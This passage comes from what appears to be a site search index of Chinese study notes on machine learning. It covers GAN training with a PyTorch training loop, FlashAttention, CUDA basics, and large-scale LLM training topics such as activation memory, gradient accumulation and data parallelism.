<p>\u5728GAN\u7684\u8bad\u7ec3\u4e2d\uff0cD\uff0cG\u4e2d\u7684MLP\u662f\u88ab\u540c\u65f6\u8bad\u7ec3\u7684\uff0cG\u7528\u4e8e\u6700\u5c0f\u5316 \\(\\log(1-D(G(z)))\\) \u5176\u4e2dz\u662f\u5e95\u566a\uff0cD\u751f\u6210\u7684\u662f\u4e00\u4e2a\u533a\u5206\uff0c\u6211\u4eec\u8bbe\u5b9a\u662f0\u65f6\uff0c\u4ed6\u80fd\u591f\u533a\u5206\u51fa\u751f\u6210\u548c\u6211\u4eec\u76ee\u6807\u4e4b\u95f4\u7684\u533a\u522b</p> <ul> <li>D\u7684\u76ee\u6807 \\(D(G(z)) = 0\\)</li> <li>G\u7684\u76ee\u6807 \\(\\log(1-D(G(z)))\\) \u6700\u5c0f\u5316</li> </ul> <p>\u5bf9\u4e8e\u540c\u4e00\u4e2a\u76ee\u6807\uff0cD\u8ba9\u5176\u5c3d\u53ef\u80fd\u5927\uff0cG\u8ba9\u5176\u5c3d\u53ef\u80fd\u5c0f\uff0c\u8fd9\u5c31\u662f\u5bf9\u6297\u7684\u542b\u4e49</p> <p>\u200b\u200b</p> <p>\u5176\u8bad\u7ec3\u8fc7\u7a0b\u8868\u73b0\u4e3a\u4e0a\u56fe\uff0c\u865a\u7ebf\u662f\u5b9e\u9645\u7684\u751f\u6210\u76ee\u6807\u7684\u5206\u5e03\uff0c\u7eff\u7ebf\u662f\u751f\u6210\u76ee\u6807\uff0c\u84dd\u8272\u865a\u7ebf\u662fD\u5bf9\u4e8e\u5176\u7684\u5206\u6570\u5224\u5b9a</p> <ul> <li>\u9996\u5148\u751f\u6210\u76ee\u6807\u4ee5\u9ad8\u65af\u5206\u5e03\u968f\u673a\u5730\u4ea7\u751f</li> <li>\u7136\u540e\u84dd\u7ebf\u8fdb\u884c\u62df\u5408\uff0c\u5728\u751f\u6210\u76ee\u6807\u8f83\u9ad8\u5904\u6253\u5206\u4e3a0\uff0c\u5728\u771f\u5b9e\u76ee\u6807\u5904\u6253\u5206\u4e3a1</li> <li>\u7136\u540e\u7eff\u7ebf\u8fdb\u884c\u62df\u5408\uff0c\u6839\u636eD\u7684\u53cd\u9988\u5411\u771f\u5b9e\u76ee\u6807\u5904\u79fb\u52a8</li> <li>\u5b8c\u6210\u62df\u5408\uff0c\u751f\u6210\u76ee\u6807\u4e0e\u5b9e\u9645\u76ee\u6807\u76f8\u540c</li> </ul> <p>\u5176\u4e2d\u6709\u4e2a\u95ee\u9898\u5c31\u662f\uff0c\u6211\u4eec\u5728\u4e00\u5f00\u59cb\u7684\u53cd\u5411\u4f20\u64ad\u4e2d\uff0c\u5f88\u5bb9\u6613\u628aD\u8bad\u7ec3\u5730\u5f88\u597d\uff0c\u800cG\u6b64\u65f6\u8fd8\u5904\u4e8e\u4e00\u4e2a\u6bd4\u8f83\u7cdf\u7cd5\u7684\u72b6\u6001\uff0c\u4f46\u662f\u5982\u679c\u628aD\u8bad\u7ec3\u7684\u5b8c\u5584\uff0c\u5bb9\u6613\u5bfc\u81f4\\(\\log(1-D(G(z)))\\)\u53d8\u4e3a0\uff0c\u4e0d\u5229\u4e8e\u540e\u7eed\u7684\u53cd\u5411\u4f20\u64ad</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/GAN/GAN/#_2","title":"\u6a21\u578b\u7ec6\u8282","text":"<p>ML_HW6.ipynb - Colab (google.com)</p> <ul> <li>Generator\uff0c\u4f7f\u7528\u4e86<code>nn.ConvTranspose2d</code>\u200b\u8fd9\u4e2a\u7ed3\u6784</li> <li>Discriminator\uff0c\u4f7f\u7528\u4e86<code>nn.Conv2d</code>\u200b\u8fd9\u4e2a\u7ed3\u6784</li> </ul> <p>\u4e24\u8005\u4e92\u4e3a\u9006\u8fc7\u7a0b\uff0c\u5377\u79ef\u4e0e\u53cd\u5377\u79ef</p> <p>\u6765\u770b\u5177\u4f53\u7684\u8bad\u7ec3\u8fc7\u7a0b</p> <pre><code>def train(self):\n        \"\"\"\n        Use this function to train generator and discriminator\n        \"\"\"\n        self.prepare_environment()\n\n        for e, epoch in enumerate(range(self.config[\"n_epoch\"])):\n            progress_bar = tqdm(self.dataloader)\n            progress_bar.set_description(f\"Epoch {e+1}\")\n            for i, data in enumerate(progress_bar):\n                imgs = data.cuda()\n                bs = imgs.size(0)\n\n                # *********************\n                # *    Train D        *\n                # *********************\n                z = Variable(torch.randn(bs, self.config[\"z_dim\"])).cuda()\n                r_imgs = Variable(imgs).cuda()\n                f_imgs = self.G(z)\n                r_label = torch.ones((bs)).cuda()\n                f_label = torch.zeros((bs)).cuda()\n\n\n                # Discriminator forwarding\n                r_logit = self.D(r_imgs)\n                f_logit = self.D(f_imgs)\n\n                \"\"\"\n                NOTE FOR SETTING DISCRIMINATOR LOSS:\n\n                GAN: \n                    loss_D = (r_loss + f_loss)/2\n                WGAN: \n                    loss_D = -torch.mean(r_logit) + torch.mean(f_logit)\n                WGAN-GP: \n                    gradient_penalty = self.gp(r_imgs, f_imgs)\n                    loss_D = -torch.mean(r_logit) + torch.mean(f_logit) + gradient_penalty\n                \"\"\"\n                # Loss for discriminator\n                r_loss = self.loss(r_logit, r_label)\n                f_loss = self.loss(f_logit, f_label)\n                loss_D = (r_loss + f_loss) / 2\n\n                # Discriminator backwarding\n                self.D.zero_grad()\n                loss_D.backward()\n                self.opt_D.step()\n\n                \"\"\"\n                NOTE FOR SETTING WEIGHT CLIP:\n\n                WGAN: below code\n                \"\"\"\n                # for p in self.D.parameters():\n                #     p.data.clamp_(-self.config[\"clip_value\"], self.config[\"clip_value\"])\n\n\n\n                # *********************\n                # *    Train G        *\n                # *********************\n                if self.steps % self.config[\"n_critic\"] == 0:\n                    # Generate some fake images.\n                    z = Variable(torch.randn(bs, self.config[\"z_dim\"])).cuda()\n                    f_imgs = self.G(z)\n\n                    # Generator forwarding\n                    f_logit = self.D(f_imgs)\n\n\n                    \"\"\"\n                    NOTE FOR SETTING LOSS FOR GENERATOR:\n\n                    GAN: loss_G = self.loss(f_logit, r_label)\n                    WGAN: loss_G = -torch.mean(self.D(f_imgs))\n                    WGAN-GP: loss_G = -torch.mean(self.D(f_imgs))\n                    \"\"\"\n                    # Loss for the generator.\n                    loss_G = self.loss(f_logit, r_label)\n\n                    # Generator backwarding\n                    self.G.zero_grad()\n                    loss_G.backward()\n                    self.opt_G.step()\n\n                if self.steps % 10 == 0:\n                    progress_bar.set_postfix(loss_G=loss_G.item(), loss_D=loss_D.item())\n                self.steps += 1\n\n            self.G.eval()\n            f_imgs_sample = (self.G(self.z_samples).data + 1) / 2.0\n            filename = os.path.join(self.log_dir, f'Epoch_{epoch+1:03d}.jpg')\n            torchvision.utils.save_image(f_imgs_sample, filename, nrow=10)\n            logging.info(f'Save some samples to {filename}.')\n\n            # Show some images during training.\n            grid_img = torchvision.utils.make_grid(f_imgs_sample.cpu(), nrow=10)\n            plt.figure(figsize=(10,10))\n            plt.imshow(grid_img.permute(1, 2, 0))\n            plt.show()\n\n            self.G.train()\n\n            if (e+1) % 5 == 0 or e == 0:\n                # Save the checkpoints.\n                torch.save(self.G.state_dict(), os.path.join(self.ckpt_dir, f'G_{e}.pth'))\n                torch.save(self.D.state_dict(), os.path.join(self.ckpt_dir, f'D_{e}.pth'))\n\n        logging.info('Finish training')\n</code></pre> <p>\u5177\u4f53\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u8bad\u7ec3G\u548cD\uff0c\u5176\u4e2d\u66f4\u65b0\u51e0\u6b21D\u4e4b\u540e\u518d\u66f4\u65b0\u4e00\u6b21G</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/GAN/GAN/#dcgan","title":"DCGAN","text":"<p>\u6211\u4eec\u5728\u6700\u65e9\u7684GAN\u4e2d\u4f7f\u7528\u7684\u662f\u57fa\u7840MLP\uff0c\u540e\u6765\u5f15\u5165\u4e86\u6548\u679c\u66f4\u597d\u7684\u7ed3\u6784\u4f18\u5316\uff0c\u4f7f\u5f97GAN\u7684\u8bad\u7ec3\u66f4\u52a0\u7a33\u5b9a</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Cuda/","title":"Cuda","text":"<p>\u4f8b\u5982 <code>__device__</code> \u6807\u8bb0\u7684\u51fd\u6570\uff0c\u53ea\u80fd\u88ab\u5176\u4ed6\u5728GPU\u4e0a\u6267\u884c\u7684\u4ee3\u7801\u6240\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u5f97\u5728\u53e6\u5916\u7684 <code>__global__</code> \u548c <code>__device__</code> \u51fd\u6570\u4e2d\u8c03\u7528</p> <p>\u5e7f\u64ad\u673a\u5236\u548cstrides\u673a\u5236</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Deep%20Learning%20System/","title":"Deep Learning System","text":"<p>\u6765\u81eaCMU\u7684\u8bfe\u7a0b\uff0cDeep Learning System\uff0c\u9009\u62e9\u5176\u4e2d\u4e00\u90e8\u5206\u8bfe\u7a0b\u542c\u4e86\uff0c\u7136\u540e\u5b8c\u6210Labs</p> <p>\u66f4\u8fdb\u4e00\u6b65\u53ef\u4ee5\u5c1d\u8bd5\u5b8c\u6210LLM System\u7684Lab\uff0c\u4ee5\u53ca336\u4e0a\u7684GPU Part\u7684Labs</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Deep%20Learning%20System/#1-ml-basic","title":"1. ML Basic","text":"<p>\u6240\u6709\u7684ML\u7cfb\u7edf\u7684\u8bad\u7ec3\u4e2d\uff0c\u6838\u5fc3\u8fc7\u7a0b\u90fd\u662f\u6c42\u51faLoss\uff0c\u53cd\u5411\u4f20\u64ad\uff0cLoss Function\u662f\u4e00\u4e2a\u8f93\u5165\u77e9\u9635\u8f93\u51fa\u4e00\u4e2a\u6807\u91cf\u7684\u51fd\u6570</p> <p>\u800c\u53cd\u5411\u4f20\u64ad\u7684\u8fc7\u7a0b\uff0c\u662f\u5bf9\u4e00\u4e2a\u51fd\u6570\u6c42\u504f\u5bfc\u7684\u8fc7\u7a0b\uff0c\u504f\u5bfc\u7684\u7ed3\u679c\u4e5f\u662f\u4e00\u4e2a\u77e9\u9635</p> <p>![[Pasted image 20251003213425.png]]</p> <p>\u4ee5\u4e0a\u662f\u8ba1\u7b97\u68af\u5ea6\u7684\u8fc7\u7a0b</p> <p>\u5728\u53cd\u5411\u4f20\u64ad\u7684\u65f6\u5019\uff0c\u5c31\u662f\u628a\u53c2\u6570\u77e9\u9635\u53bb\u51cf\u53bb\u8fd9\u4e2a\u8ba1\u7b97\u51fa\u6765\u7684\u68af\u5ea6\u4e58\u4ee5\u5b66\u4e60\u7387</p> <p>\u4f46\u5728\u5b9e\u9645\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4f1a\u91c7\u7528SGD\u65b9\u6848\uff0c\u4e5f\u5c31\u662f\u968f\u673a\u7684\u68af\u5ea6\u4e0b\u964d\uff0c\u5b83\u548c\u6807\u51c6\u7684\u68af\u5ea6\u4e0b\u964d\u7684\u533a\u522b\u5728\u4e8e\uff0c\u5176\u4e0d\u4f1a\u5bf9\u6574\u4e2a\u8bad\u7ec3\u6570\u636e\u96c6\u8ba1\u7b97\u68af\u5ea6\uff0c\u800c\u662f\u968f\u673a\u9009\u62e9\u4e00\u4e2aminibatch\u6765\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u7528\u8fd9\u4e2abatch\u4e2d\u7684\u6837\u672c\u7684\u68af\u5ea6\u7684\u5e73\u5747\u503c\u6765\u8fdb\u884c\u68af\u5ea6\u4e0b\u964d</p> <p>![[Pasted image 20251003214729.png]]</p> <p>\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53d1\u73b0\u4e00\u4e2a\u73b0\u8c61\u662f\uff0c\u6211\u4eec\u7684Loss\u662f\u57fa\u4e8e\u4e00\u4e2aBatch\u7684\u7ed3\u679c\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u6c42\u68af\u5ea6\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e5f\u662f\u5728\u57fa\u4e8e\u4e00\u4e2a\u77e9\u9635\u8ba1\u7b97\u68af\u5ea6</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/FlashAttention/","title":"FlashAttention","text":"<p>Flash Attention\u5e76\u4e0d\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f18\u5316\u6280\u672f\uff0c\u800c\u5df2\u7ecf\u4e8b\u5b9e\u4e0a\u6210\u4e3a\u4e86\u73b0\u9636\u6bb5\u5927\u6a21\u578b\u90e8\u7f72\u7684\u57fa\u77f3\uff0c\u5176\u6838\u5fc3\u662f\u5b9e\u73b0\u4e86softmax\u7684tile-based\u5904\u7406\uff0c\u5b9e\u73b0\u4e86\u7b49\u4ef7\u4e14\u9ad8\u6548\u7684attention\u8ba1\u7b97</p> <p>Flash Attention\u7684\u7248\u672c\u66f4\u8fed\uff0c\u662f\u5bf9\u65b0\u7248\u672cN\u5361\u7684\u4e0d\u65ad\u5fae\u8c03</p> <ul> <li>FA1 \u901a\u8fc7Tiling\u548c\u91cd\u8ba1\u7b97\uff0c\u5c06ON2\u7684HBM\u8bbf\u95ee\u8f6c\u6362\u6210SRAM\u64cd\u4f5c</li> <li>FA2 \u901a\u8fc7Ampere\u67b6\u6784\u7279\u6027\uff0c\u5f15\u5165sequence\u7ef4\u5ea6\u5e76\u884c\uff0c\u5c06\u5de5\u4f5c\u8d1f\u8f7d\u5212\u5206\u4e3aWarp\u7ea7\u522b</li> <li>FA3 \u901a\u8fc7Hopper\u67b6\u6784\u7279\u6027\uff0c\u5229\u7528TMA\u5f15\u64ce\u5b9e\u73b0\u6570\u636e\u7684\u5f02\u6b65\u642c\u8fd0\uff0c\u5728Warp Group\u5c42\u9762\u5b9e\u73b0\u4e86GEMM\u8ba1\u7b97\u548cSoftmax\u7684\u6df1\u5ea6\u6d41\u6c34\u7ebfoverlap\u3001</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/FlashAttention/#flexattention","title":"FlexAttention","text":"<p>\u867d\u7136FlashAttention\u6548\u679c\u4f18\u79c0\uff0c\u4f46\u662f\u5176\u4ee3\u7801\u5b9e\u73b0\u8f83\u4e3a\u590d\u6742\uff0c\u800c\u5f53\u5927\u5bb6\u60f3\u8981\u5b9e\u7528\u4e0d\u540c\u7684attention\u53d8\u4f53\u7684\u65f6\u5019\uff0c\u5f80\u5f80\u9700\u8981\u91cd\u5199\u5bf9\u5e94\u7684cuda kernel</p> <p>\u5e94\u5bf9\u8fd9\u4e2a\u95ee\u9898\uff0cPytorch\u56e2\u961f\u63d0\u51fa\u4e86Flex Attention\uff0c\u63d0\u4f9b\u4e86\u4e00\u5957\u7075\u6d3b\u7684API\uff0c\u8ba9\u5927\u5bb6\u5b9e\u73b0\u4e0d\u540c\u7684attention\u53d8\u4f53\u7684\u65f6\u5019\uff0c\u80fd\u591f\u81ea\u52a8\u5b9e\u73b0\u7b97\u5b50\u878d\u5408</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/","title":"Large scale book","text":"<p>\u8fd9\u662f huggingface \u4e2d\u627e\u5230\u7684\u4e00\u4e2a\u5173\u4e8eLLM\u8bad\u7ec3\u7684\u4e00\u672c\u5f88\u597d\u7684\u7cfb\u7edf\u6307\u5357\uff0c\u4e3b\u8981\u5173\u4e8e\u5e95\u5c42\u7684\u5b58\u50a8\u548cLLM system\uff0c\u5e76\u4e14\u6709\u5f88\u597d\u7684\u53ef\u89c6\u5316</p> <p>https://huggingface.co/spaces/nanotron/ultrascale-playbook?section=high-level_overview \u8fd9\u662f\u94fe\u63a5</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#1-gpu","title":"1. \u5355GPU\u8bad\u7ec3","text":"<p>\u4e00\u6b21\u6b63\u5e38\u7684\u6a21\u578b\u8bad\u7ec3\uff0c\u5305\u62ec\u4ee5\u4e0b\u6d41\u7a0b</p> <ol> <li>\u4e00\u6b21\u524d\u5411\u4f20\u64ad\uff0c\u8ba1\u7b97Loss</li> <li>\u4e00\u6b21\u53cd\u5411\u4f20\u64ad\uff0c\u8ba1\u7b97\u68af\u5ea6</li> <li>\u57fa\u4e8e\u68af\u5ea6\u8fdb\u884c\u53c2\u6570\u66f4\u65b0</li> </ol> <p></p> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u6d89\u53ca\u5230\u4e86\u7b2c\u4e00\u4e2a\u8d85\u53c2\u6570 Batch size\uff0c\u4e5f\u662f\u6211\u4eec\u524d\u5411\u8ba1\u7b97Loss\u7684\u65f6\u5019\u7684\u6570\u636e\u6279\u6b21\u5927\u5c0f\uff0c\u6839\u636e\u5b9e\u9a8c\u8868\u660e\uff0c\u5c0f\u6279\u6b21\u7684\u5b66\u4e60\u6548\u7387\u66f4\u9ad8\uff0c\u4f46\u662f\u5927\u6279\u6b21\u7684\u6570\u636e\u566a\u58f0\u66f4\u5c0f</p> <p>\u6211\u4eec\u6765\u5b9a\u4e49\u7b2c\u4e00\u4e2a\u53c2\u6570 \\(bst = bs * sequence\\ size\\) \u8fd9\u662f\u6307\u4e00\u4e2abatch size\u4e2d\u7684token\u6570\u91cf</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\u7684\u5185\u5b58\uff0c\u5360\u636e\u6211\u4eec\u7684\u5185\u5b58\u7684\u5185\u5bb9\u7269\u4e3b\u8981\u662f\u5404\u79cd\u5404\u6837\u7684\u5f20\u91cf\uff0c\u4e00\u4e2a\u5f20\u91cf\u7684\u5b58\u50a8\u7531\u4e24\u4e2a\u56e0\u7d20\u51b3\u5b9a</p> <ul> <li>\u5f62\u72b6\uff1a\u5f62\u72b6\u7531\u5404\u79cd\u8d85\u53c2\u51b3\u5b9a\uff0c\u6bd4\u5982 batch size, sequence length, attention head number</li> <li>\u7cbe\u5ea6\uff1aFP8, FP32</li> </ul> <p>\u4ece\u5185\u5b58\u7684\u542b\u4e49\u4e0a\u5212\u5206\uff0c\u53ef\u4ee5\u5206\u4e3a\u4e0b\u56fe\u4e2d\u7684\u5404\u7c7b\u5185\u5bb9</p> <p></p> <p>Weights / Gradients / Optimizer states</p> <p>\u5148\u4ece\u524d\u4e09\u4e2a\u5185\u5b58\u5360\u7528\u5f00\u59cb</p> <p>\u5173\u4e8etransformer LLM\uff0c\u5176\u53c2\u6570\u6570\u91cf\u53ef\u4ee5\u7531\u4ee5\u4e0b\u516c\u5f0f\u7ed9\u51fa</p> <p></p> <p>\u5176\u4e2dh\u662fhidden states, v\u662f\u8bcd\u8868\u5927\u5c0f\uff0cL\u662f\u6a21\u578b\u5c42\u6570\uff0c\u800c\u5728\u5168\u7cbe\u5ea6FP32\u7684\u8bad\u7ec3\u4e2d\uff0c\u53c2\u6570\u548c\u68af\u5ea6\u90fd\u662f4\u5b57\u8282\uff0c\u800cAdam\u4f18\u5316\u5668\u8981\u989d\u5916\u5b58\u50a8\u52a8\u91cf\u548c\u65b9\u5dee</p> <p></p> <p>\u5728\u5982\u4eca\u66f4\u5e38\u89c1\u7684\u6df7\u5408\u7cbe\u5ea6\u8bad\u7ec3\u4e2d\uff0c\u7528BF16\u6765\u5b58\u50a8\u53c2\u6570\u548c\u68af\u5ea6\uff0c\u4e5f\u5c31\u662f\u4ece4\u4e2a\u5b57\u8282\u964d\u4f4e\u4e3a2\u4e2a\u5b57\u8282\uff0c\u4f46Adam\u7684\u4f18\u5316\u5668\u72b6\u6001\u4e3a\u4e86\u7a33\u5b9a\u8fd8\u662f\u8981\u4fdd\u6301\u5168\u7cbe\u5ea6\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u8981\u4fdd\u5b58\u4e00\u4efd\u5168\u7cbe\u5ea6\u7684\u53c2\u6570\u526f\u672c</p> <p></p> <p>Activation Memory</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790\u6fc0\u6d3b\u503c\u6240\u5360\u7684\u5185\u5b58\uff0c\u8fd9\u7bc7\u6587\u7ae0 \u5f88\u597d\u5730\u8bb2\u8ff0\u4e86\u6fc0\u6d3b\u5185\u5b58\u5730\u542b\u4e49\uff0c\u5728\u6df7\u5408\u7cbe\u5ea6\u5730\u60c5\u5f62\u4e0b\uff0c\u6fc0\u6d3b\u503c\u6240\u5360\u5730\u5185\u5b58\u603b\u91cf\u4e3a</p> <p></p> <p>L\u8868\u793a\u5c42\u6570\uff0cseq\u8868\u793a\u5e8f\u5217\u957f\u5ea6\uff0cbs\u8868\u793abatchsize\uff0ch\u8868\u793ahidden states\uff0c\\(n_{heads}\\) \u8868\u793a\u6ce8\u610f\u529b\u5934\u6570\u91cf</p> <p></p> <p>\u7531\u4e0a\u56fe\u548c\u4e0a\u8ff0\u516c\u5f0f\u53ef\u4ee5\u770b\u51fa\uff0c\u6fc0\u6d3b\u503c\u6240\u5360\u5730\u5185\u5b58\u968f\u7740\u5e8f\u5217\u957f\u5ea6\u4e8c\u6b21\u589e\u957f\uff0c\u9762\u5bf9\u8fd9\u4e2a\u96be\u9898\uff0c\u6211\u4eec\u5f15\u5165\u4e00\u4e2a\u91cd\u8981\u5730Tricks</p> <p>Activation recomputation</p> <p>\u8fd9\u9879\u6280\u672f\u79f0\u4e3a\u6fc0\u6d3b\u503c\u91cd\u8ba1\u7b97\uff0c\u5c31\u662f\u5728\u524d\u5411\u8fc7\u7a0b\u4e2d\u4e22\u5f03\u4e00\u4e9b\u6fc0\u6d3b\u503c\uff0c\u5728\u53cd\u5411\u4f20\u64ad\u662f\u82b1\u8d39\u4e00\u4e9b\u65f6\u95f4\u5c06\u9700\u8981\u8ba1\u7b97\u5730\u6fc0\u6d3b\u503c\u91cd\u65b0\u7b97\u4e00\u904d</p> <p></p> <p>\u5f53\u7136\u8fd8\u6709\u4e00\u4e2atrade-off\u662f\u6211\u4eec\u9700\u8981\u4fdd\u5b58\u5bf9\u5e94\u5c42\u5730\u68c0\u67e5\u70b9\uff0c\u8ba1\u7b97\u8868\u660e\uff0c\u5982\u679c\u6211\u4eec\u4e22\u5f03\u6240\u6709\u5730\u6fc0\u6d3b\u503c\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u5728\u53cd\u5411\u5730\u65f6\u5019\u91cd\u65b0\u505a\u4e00\u904d\u524d\u5411\uff0c\u4f1a\u589e\u52a030-40%\u7684\u8ba1\u7b97\u91cf</p> <p>\u56e0\u6b64\u6211\u4eec\u5f80\u5f80\u4f1a\u6709\u9009\u62e9\u5730\u8fdb\u884c\u6fc0\u6d3b\u503c\u4e22\u5f03\uff0c\u7814\u7a76\u8868\u660e\uff0cAttention\u64cd\u4f5c\u7684\u6fc0\u6d3b\u503c\u589e\u957f\u5f88\u5feb\uff0c\u4f46\u662f\u5176\u524d\u5411\u7684\u6210\u672c\u5f88\u4f4e</p> <p>\u73b0\u5728\u6700\u4e3a\u5e38\u7528\u7684FlashAttention\u4e5f\u5f88\u5de7\u5999\u5730\u5c06\u6fc0\u6d3b\u503c\u91cd\u8ba1\u7b97\u7eb3\u5165\u6846\u67b6\u4e2d</p> <p>Gradient Accumulation</p> <p>\u5bf9\u4e8e\u6fc0\u6d3b\u503c\u53e6\u4e00\u4e2a\u5927\u5934\u7684\u5f71\u54cd\u56e0\u7d20\u662fBatch size\uff0c\u6211\u4eec\u4f1a\u91c7\u7528Gradient Accumulation\u8fd9\u4e2a\u8bbe\u8ba1\u6765\u5c1d\u8bd5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <p>\u68af\u5ea6\u7d2f\u79ef\u5305\u62ec\u5c06\u4e00\u6279\u6b21\u6570\u636e\u5206\u6210\u591a\u4e2aminibatch\uff0c\u7136\u540e\u6839\u636e\u6bcf\u4e2aminibatch\u8fdb\u884c\u524d\u5411\u548c\u540e\u65b9\uff0c\u8ba1\u7b97\u68af\u5ea6\uff0c\u5728\u4f18\u5316\u4e4b\u524d\u5c06\u6240\u6709minibatch\u7684\u68af\u5ea6\u76f8\u52a0</p> <p></p> <p>\u6211\u4eec\u7528mbs\u8868\u793aminibatch\uff0c\u7528gbs\u8868\u793a\u5168\u5c40\u7684batch size\uff0c\u5c06gbs\u62c6\u6210minibatch\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u987a\u5e8f\u5904\u7406minibatch\u6765\u51cf\u5c11\u6fc0\u6d3b\u5185\u5b58\uff0c\u4f46\u662f\u4e5f\u5b58\u5728tradeoff\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u591a\u505a\u51e0\u6b21\u524d\u5411\u53cd\u5411</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662fminibatch\u7684\u68af\u5ea6\u8ba1\u7b97\u5176\u5b9e\u53ef\u4ee5\u5e76\u884c\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u7684\u591aGPU\u4e5f\u5c31\u6709\u4e86\u7528\u6b66\u4e4b\u5730</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Large%20scale%20book/#2-data-parallelism","title":"2. Data Parallelism","text":"<p>DP\u7684\u7406\u5ff5\u5c31\u662f\u5728\u591a\u4e2aGPU\u4e0a\u590d\u5236\u6a21\u578b\uff0c\u5bf9\u4e8e\u8fd9\u4e9b\u6a21\u578b\u7684\u590d\u5236\u7248\u672c\uff0c\u53ef\u4ee5\u8fdb\u884cMiniBatch\u7684\u66f4\u65b0\uff0c\u5176\u5b9e\u548c\u521a\u624d\u7684\u68af\u5ea6\u7d2f\u79ef\u7684\u65b9\u6848\u662f\u4e00\u6837\u7684</p> <p>\u56e0\u4e3a\u6211\u4eec\u5bf9\u6bcf\u4e2aGPU\u8fdb\u884c\u68af\u5ea6\u8ba1\u7b97\uff0c\u5f97\u5230\u7684\u4e0d\u540c\u68af\u5ea6\u6211\u4eec\u9700\u8981\u8fdb\u884c\u540c\u6b65\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528all-reduce\u7684\u5206\u5e03\u5f0f\u64cd\u4f5c\u6765\u5bf9\u6a21\u578b\u5b9e\u4f8b\u7684\u68af\u5ea6\u8fdb\u884c\u5e73\u5747\uff0c\u968f\u540e\u518d\u8fdb\u884c\u4f18\u5316</p> <p></p> <p>\u4e00\u4e2a\u7b80\u5355\u7684DP\u6d41\u7a0b\u5982\u4e0a\uff0c\u4f46\u662f\u4e0a\u8ff0\u6d41\u7a0b\u4ecd\u7136\u4e0d\u662f\u6700\u7ec8\u5f62\u6001\uff0c\u56e0\u4e3a\u6b64\u65f6GPU\u5728\u901a\u4fe1\u8fc7\u7a0b\u4e2d\u662f\u7a7a\u95f2\u72b6\u6001</p> <p>\u65b9\u6848\u4e00\uff1a\u91cd\u53e0\u68af\u5ea6\u8ba1\u7b97\u548c\u901a\u4fe1\uff0c\u56e0\u4e3a\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u7b49\u5f85\u6574\u4e2a\u6a21\u578b\u7684\u68af\u5ea6\u8ba1\u7b97\u5b8c\u6210\u518d\u8fdb\u884call-reduce\uff0c\u5b8c\u5168\u53ef\u4ee5\u5728\u4e00\u8fb9\u8ba1\u7b97\u68af\u5ea6\uff0c\u4e00\u8fb9\u66f4\u65b0</p> <pre><code>def register_backward_hook(self, hook):\n    for p in self.module.parameters():\n        if p.requires_grad is True:\n            p.register_post_accumulate_grad_hook(hook)\n</code></pre> <p></p> <p>\u65b9\u6848\u4e8c\uff1abucket\u68af\u5ea6\u6c42\u548c\uff0c\u56e0\u4e3aGPU\u66f4\u9002\u5408\u5bf9\u5927\u5f20\u91cf\u505a\u64cd\u4f5c\uff0c\u800c\u4e0d\u662f\u5bf9\u591a\u4e2a\u5c0f\u5f20\u91cf\u505a\u64cd\u4f5c\uff0c\u5bf9\u4e8e\u901a\u4fe1\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u4e5f\u53ef\u4ee5\u8ba9\u68af\u5ea6\u6309bucket\u8fdb\u884call reduce</p> <p></p> <p>\u5728Pytorch\u4e2d\uff0c\u5f80\u5f80\u5728\u4e0d\u9700\u8981All-reduce\u7684backward\u64cd\u4f5c\u4e2d\u52a0\u4e0a <code>model.no_sync()</code> \u88c5\u9970\u5668</p> <p>DP\u6548\u679c\u5f88\u597d\uff0c\u4f46\u662f\u5728GPU\u6570\u91cf\u8fbe\u5230\u4e0a\u767e\u4e0a\u5343\u7684\u65f6\u5019\uff0c\u5176\u534f\u8c03\u5f00\u9500\u4f1a\u663e\u8457\u589e\u52a0\uff0c\u5e76\u4e14\u7f51\u7edc\u5f00\u9500\u4f1a\u5f88\u5927\uff0c\u5bfc\u81f4\u5176\u9010\u6e10\u53d8\u5f97\u4f4e\u6548</p> 